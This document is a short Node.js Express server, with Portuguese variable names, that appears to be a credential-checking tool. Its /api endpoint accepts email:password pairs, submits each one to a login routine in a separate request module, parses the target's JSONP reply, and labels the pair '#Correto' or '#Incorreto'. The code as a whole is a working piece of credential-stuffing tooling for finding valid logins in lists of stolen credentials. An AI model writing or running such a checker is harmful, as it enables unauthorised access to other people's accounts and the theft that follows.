const express = require('express')
const app = express()
const resExecute = require('./request')

app.use(express.static(__dirname + '/public'));

app.get('/', (req,res) => {
    res.sendFile(__dirname+'/index.html')
})


app.get('/api', (req,res) => {

    var lista = req.query.lista
    var [email,senha] = lista.split(':')
    async function executar(){
        await resExecute.requestLogin(email,senha).then(data =>{
            const splits = data.data.split('/**/jQuery17206608213630937556_1610255984310({"status":"')
            const splits2 = splits[1].split('",')
            var status = splits2[0];
            if(status == 'fail'){
                res.send({status: '#Incorreto', email: email, senha: senha });
            }
            if(status == 'ok'){
                res.send({status: '#Correto', email: email, senha: senha });
            }
        })
    }
    executar()
})

app.listen(80,() => {
    console.log('OK');
})